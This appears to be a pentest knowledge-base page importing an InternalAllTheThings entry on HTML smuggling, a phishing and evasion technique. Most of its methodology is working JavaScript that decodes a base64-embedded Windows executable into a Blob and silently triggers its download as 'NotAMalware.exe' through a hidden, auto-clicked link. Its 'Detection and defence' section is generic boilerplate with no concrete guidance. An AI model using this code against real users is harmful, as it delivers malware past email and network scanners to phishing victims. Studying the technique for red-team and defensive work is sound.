---
title: HTML Smuggling
type: technique
tags: [evasion, initial-access, phishing, reference-import, web, windows]
phase: exploitation
date_created: 2026-05-13
date_updated: 2026-07-02
sources: [InternalAllTheThings]
---

# HTML Smuggling

## What it is

Technical reference for **HTML Smuggling** collected from InternalAllTheThings during an internal/cloud assessment ingest.

## How it works

HTML smuggling embeds a malicious binary payload inside an HTML page as a JavaScript Blob object, then uses the browser's built-in download mechanism to reconstruct and save the file to the victim's system when the page is opened. The payload is never transmitted as a raw file over the network; instead it arrives as HTML content, bypassing network perimeter controls and email attachment scanners that inspect file types. This technique is commonly chained with phishing emails or malicious links to deliver executable payloads (LNK files, ISO containers, Office documents) to targets.

## Attack phases

- **Exploitation**: primary phase for this note (credential and control-plane abuse)
- **Adjacent phases**: overlaps are common once credentials or lateral paths appear

## Prerequisites

Authorized scope covering the depicted systems; valid credentials or network reach as required by each command block inside the methodology body.

## Methodology

The following imported sections retain upstream ordering, tables, and copy-pasta blocks from InternalAllTheThings.

## Summary

- [Description](#description)
- [Executable Storage](#executable-storage)

## Description

HTML Smuggling consists of making a user to navigate to our crafted HTML page which automaticaly download our malicious file.

## Executable storage

We can store our payload in a Blob object => JS: `var blob = new Blob([data], {type: 'octet/stream'});`
To perform the download, we need to create an Object Url => JS: `var url = window.URL.createObjectURL(blob);`
With those two elements, we can create with Javascript our \<a> tag which will be used to download our malicious file:

```Javascript
var a = document.createElement('a');
document.body.appendChild(a);
a.style = 'display: none';
var url = window.URL.createObjectURL(blob);
a.href = url;
a.download = fileName;
a.click();
window.URL.revokeObjectURL(url);
```

To store ou payload, we use base64 encoding:

```Javascript
function base64ToArrayBuffer(base64) {
 var binary_string = window.atob(base64);
 var len = binary_string.length;
 var bytes = new Uint8Array( len );
 for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
 return bytes.buffer;
}
       
var file ='TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAA...
var data = base64ToArrayBuffer(file);
var blob = new Blob([data], {type: 'octet/stream'});
var fileName = 'NotAMalware.exe';
```

## Bypasses and variants

Enumerate case-specific bypasses inside the methodologies above when upstream documented alternate paths.

## Detection and defence

Apply vendor baselines for logging, least privilege, patch cadence, and segmentation. Map signals to SOC playbooks relevant to each platform referenced in this page.

## Tools

Tool references are inline in **Methodology**; see the `tools/` pages for CLI usage.

## Sources

- Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).
